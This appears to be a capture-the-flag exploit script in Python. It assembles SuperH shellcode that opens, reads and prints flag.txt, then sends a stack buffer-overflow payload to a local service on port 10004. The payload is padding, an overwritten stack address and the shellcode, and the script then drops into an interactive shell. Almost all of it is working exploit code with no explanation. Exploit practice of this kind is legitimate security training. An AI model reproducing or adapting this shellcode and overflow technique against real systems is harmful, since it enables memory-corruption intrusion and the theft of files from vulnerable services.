asm = '''.section .text
.global _start
.ascii "%s"
_start:
    bra get_addr
ret:
    sts.l   pr,@-r15
    mov.l   @r15+,r1
open:
	mov r1, r5
	xor r6, r6
	xor r7, r7
    mov	#5, r4
    trapa	#34
read:
	mov r0, r5
	mov r1, r6
	mov #0x7f, r7
    mov	#3, r4
    trapa	#34
write:
	mov #1, r5
	mov r1, r6
	mov #0x7f, r7
    mov	#4, r4
    trapa	#34
get_addr:
    bsr ret
    nop
.ascii "%s"
'''

import os
from lib.mylib import *

ARCH = 'sh'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10004
s = mysock(IP, PORT)
s.send('\n000')
SP = 0x1b0c
shellcode = 'AAAAAAAAAAAAAAAA' + pb(SP) * 2 + shellcode + '\n'
sl(s, shellcode)
shell(s)
